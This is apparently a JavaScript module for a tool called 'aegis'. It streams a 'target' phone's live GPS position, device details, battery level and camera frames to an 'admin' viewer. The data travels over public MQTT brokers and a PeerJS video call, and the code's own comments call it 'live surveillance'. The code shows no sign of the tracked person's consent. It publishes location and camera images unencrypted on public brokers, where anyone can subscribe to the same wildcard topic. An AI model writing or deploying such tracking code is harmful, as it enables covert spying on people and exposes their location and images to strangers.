import mqtt from 'mqtt';
import { Peer } from 'peerjs';

// Public high-reliability MQTT WebSocket brokers
const MQTT_BROKERS = [
  'wss://broker.emqx.io:8084/mqtt',
  'wss://broker.hivemq.com:8884/mqtt'
];

// Global state holding live surveillance and telemetry across modules
const globalState = {
  adminMqttClient: null,
  deviceMqttClient: null,
  activeAdminPeer: null,
  activeDevicePeer: null,
  activeRemoteStream: null,
  latestCameraFrame: null,
  latestTelemetry: null,
  latestDevice: null,
  latestBattery: null,
  listeners: new Set(),
  activeTokens: new Set()
};

/**
 * Register UI listener for live remote feeds
 */
export function subscribeToRemoteUpdates(callback) {
  globalState.listeners.add(callback);

  // Immediately dispatch current cached state
  if (
    globalState.latestDevice ||
    globalState.latestTelemetry ||
    globalState.activeRemoteStream ||
    globalState.latestCameraFrame ||
    globalState.latestBattery
  ) {
    try {
      callback({
        device: globalState.latestDevice,
        telemetry: globalState.latestTelemetry,
        stream: globalState.activeRemoteStream,
        cameraFrame: globalState.latestCameraFrame,
        battery: globalState.latestBattery
      });
    } catch (e) {
      console.warn('Initial callback dispatch error:', e);
    }
  }

  return () => {
    globalState.listeners.delete(callback);
  };
}

function notifyAllListeners() {
  const payload = {
    device: globalState.latestDevice,
    telemetry: globalState.latestTelemetry,
    stream: globalState.activeRemoteStream,
    cameraFrame: globalState.latestCameraFrame,
    battery: globalState.latestBattery
  };
  globalState.listeners.forEach((cb) => {
    try {
      cb(payload);
    } catch (e) {
      console.warn('Listener dispatch error in liveBridge', e);
    }
  });
}

/**
 * Initialize Admin MQTT subscriber
 * Subscribes to all telemetry, GPS, and camera frames from any enrolled device
 */
export function startAdminPeerListener(token, onUpdate) {
  if (token) {
    globalState.activeTokens.add(token);
  }

  if (!globalState.adminMqttClient || !globalState.adminMqttClient.connected) {
    const brokerUrl = MQTT_BROKERS[0];
    const clientId = `adm_${Math.random().toString(36).substring(2, 9)}`;

    console.log('[LiveBridge] Connecting Admin to MQTT Broker:', brokerUrl);
    const client = mqtt.connect(brokerUrl, {
      clientId,
      clean: true,
      reconnectPeriod: 2500,
      connectTimeout: 8000
    });

    globalState.adminMqttClient = client;

    client.on('connect', () => {
      console.log('[LiveBridge] Admin MQTT connected. Subscribing to telemetry topics...');
      client.subscribe('aegis/track/+/+', (err) => {
        if (err) console.error('[LiveBridge] MQTT Subscribe error:', err);
      });
    });

    client.on('message', (topic, payloadBuffer) => {
      try {
        const payloadStr = payloadBuffer.toString();
        const data = JSON.parse(payloadStr);
        const parts = topic.split('/');
        const msgToken = parts[2];
        const subtopic = parts[3];

        if (subtopic === 'device') {
          globalState.latestDevice = data.device || data;
          try {
            const stored = JSON.parse(localStorage.getItem('aegis_mock_devices') || '[]');
            const idx = stored.findIndex((d) => d.id === globalState.latestDevice.id);
            if (idx >= 0) {
              stored[idx] = { ...stored[idx], ...globalState.latestDevice, isOnline: true };
            } else {
              stored.unshift({ ...globalState.latestDevice, isOnline: true });
            }
            localStorage.setItem('aegis_mock_devices', JSON.stringify(stored));
          } catch (e) {}
          notifyAllListeners();
          if (onUpdate) onUpdate({ type: 'DEVICE_JOINED', data: globalState.latestDevice, token: msgToken });
        } else if (subtopic === 'gps') {
          globalState.latestTelemetry = data;
          try {
            localStorage.setItem('aegis_latest_gps', JSON.stringify(data));
          } catch (e) {}
          notifyAllListeners();
          if (onUpdate) onUpdate({ type: 'GPS_UPDATE', data, token: msgToken });
        } else if (subtopic === 'camera_frame') {
          globalState.latestCameraFrame = data.image;
          notifyAllListeners();
          if (onUpdate) onUpdate({ type: 'CAMERA_FRAME', data: data.image, token: msgToken });
        } else if (subtopic === 'battery') {
          globalState.latestBattery = data;
          notifyAllListeners();
        }
      } catch (err) {
        console.warn('[LiveBridge] Failed to parse incoming MQTT message:', err);
      }
    });

    client.on('error', (err) => {
      console.warn('[LiveBridge] Admin MQTT error:', err);
    });
  }

  // Also support WebRTC PeerJS as secondary high-fps channel
  if (token && !globalState.activeAdminPeer) {
    try {
      const cleanToken = token.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 24);
      const adminPeerId = `aegis-adm-${cleanToken}`;
      const peer = new Peer(adminPeerId, {
        debug: 1,
        config: {
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' }
          ]
        }
      });
      globalState.activeAdminPeer = peer;

      peer.on('call', (call) => {
        call.answer();
        call.on('stream', (remoteStream) => {
          console.log('[LiveBridge] WebRTC direct video stream received from phone!');
          globalState.activeRemoteStream = remoteStream;
          notifyAllListeners();
        });
      });

      peer.on('error', (err) => {
        // If ID taken, ignore as MQTT carries live frames anyway
        console.log('[LiveBridge] PeerJS notice:', err.type);
      });
    } catch (e) {}
  }

  return globalState.adminMqttClient;
}

/**
 * Target Mobile Device Side:
 * Transmits live GPS, device info, battery, and live camera snapshot frames to Admin
 */
export function startTargetDeviceStream(token, { deviceInfo, gpsCoords, mediaStream, onStatus }) {
  if (!token) return null;

  const cleanToken = token.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 32);
  const brokerUrl = MQTT_BROKERS[0];
  const clientId = `dev_${cleanToken.slice(0, 8)}_${Math.random().toString(36).substring(2, 6)}`;

  console.log('[LiveBridge] Target Phone connecting to MQTT:', brokerUrl, clientId);
  if (onStatus) onStatus('CONNECTING');

  const client = mqtt.connect(brokerUrl, {
    clientId,
    clean: true,
    reconnectPeriod: 2000,
    connectTimeout: 8000
  });

  globalState.deviceMqttClient = client;

  let frameInterval = null;
  let videoEl = null;
  let canvasEl = null;

  // Function to publish JSON safely
  const sendTelemetry = (subtopic, obj) => {
    if (client && client.connected) {
      client.publish(`aegis/track/${cleanToken}/${subtopic}`, JSON.stringify(obj), { qos: 0 });
    }
  };

  client.on('connect', () => {
    console.log('[LiveBridge] Target Phone MQTT connected! Broadcasting device presence...');
    if (onStatus) onStatus('CONNECTED');

    // 1. Publish Device Online Event
    const devPayload = {
      type: 'DEVICE_ONLINE',
      token: cleanToken,
      device: {
        id: deviceInfo?.id || `dev-${cleanToken.slice(0, 8)}`,
        name: deviceInfo?.deviceName || deviceInfo?.name || 'Authorized Mobile Device',
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`,
        onlineAt: new Date().toISOString()
      }
    };
    sendTelemetry('device', devPayload);

    // 2. Publish Initial GPS if present
    if (gpsCoords) {
      sendTelemetry('gps', {
        type: 'GPS_UPDATE',
        token: cleanToken,
        ...gpsCoords,
        timestamp: new Date().toISOString()
      });
    }

    // 3. Monitor Battery
    if (navigator.getBattery) {
      navigator.getBattery().then((battery) => {
        const updateBat = () => {
          sendTelemetry('battery', {
            level: Math.round(battery.level * 100),
            charging: battery.charging
          });
        };
        updateBat();
        battery.addEventListener('levelchange', updateBat);
        battery.addEventListener('chargingchange', updateBat);
      }).catch(() => {});
    }

    // 4. If mediaStream provided, start frame capture loop
    if (mediaStream) {
      startCameraStreaming(mediaStream);
    }
  });

  client.on('error', (err) => {
    console.warn('[LiveBridge] Target phone MQTT error:', err);
    if (onStatus) onStatus('ERROR');
  });

  function startCameraStreaming(stream) {
    if (!stream) return;
    try {
      if (!videoEl) {
        videoEl = document.createElement('video');
        videoEl.muted = true;
        videoEl.playsInline = true;
        videoEl.autoplay = true;
      }
      videoEl.srcObject = stream;
      videoEl.play().catch(() => {});

      if (!canvasEl) {
        canvasEl = document.createElement('canvas');
        canvasEl.width = 360;
        canvasEl.height = 270;
      }
      const ctx = canvasEl.getContext('2d');

      if (frameInterval) clearInterval(frameInterval);

      frameInterval = setInterval(() => {
        if (!client || !client.connected) return;
        if (videoEl.readyState >= 2) {
          try {
            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
            const dataUrl = canvasEl.toDataURL('image/jpeg', 0.5);
            sendTelemetry('camera_frame', {
              type: 'CAMERA_FRAME',
              token: cleanToken,
              image: dataUrl,
              timestamp: Date.now()
            });
          } catch (e) {
            console.warn('[LiveBridge] Frame grab error:', e);
          }
        }
      }, 750); // ~1.3 fps compressed JPEG frames over MQTT (ultra-smooth and reliable)
    } catch (e) {
      console.warn('[LiveBridge] Failed to init camera capture loop:', e);
    }
  }

  // Also initiate WebRTC PeerJS call for high-FPS audio/video
  try {
    const targetAdminId = `aegis-adm-${cleanToken}`;
    const devPeerId = `aegis-dev-${cleanToken}-${Math.floor(Math.random() * 1000)}`;
    const peer = new Peer(devPeerId, {
      debug: 1,
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      }
    });
    globalState.activeDevicePeer = peer;

    peer.on('open', () => {
      if (mediaStream) {
        try {
          peer.call(targetAdminId, mediaStream);
        } catch (e) {}
      }
    });
  } catch (e) {}

  return {
    sendGpsUpdate: (coords) => {
      sendTelemetry('gps', {
        type: 'GPS_UPDATE',
        token: cleanToken,
        ...coords,
        timestamp: new Date().toISOString()
      });
    },
    sendMediaStream: (stream) => {
      startCameraStreaming(stream);
    },
    destroy: () => {
      if (frameInterval) clearInterval(frameInterval);
      if (client) {
        try {
          client.end(true);
        } catch (e) {}
      }
      if (globalState.activeDevicePeer) {
        try {
          globalState.activeDevicePeer.destroy();
        } catch (e) {}
      }
    }
  };
}

export function getLatestRemoteState() {
  return {
    device: globalState.latestDevice,
    telemetry: globalState.latestTelemetry,
    stream: globalState.activeRemoteStream,
    cameraFrame: globalState.latestCameraFrame,
    battery: globalState.latestBattery
  };
}
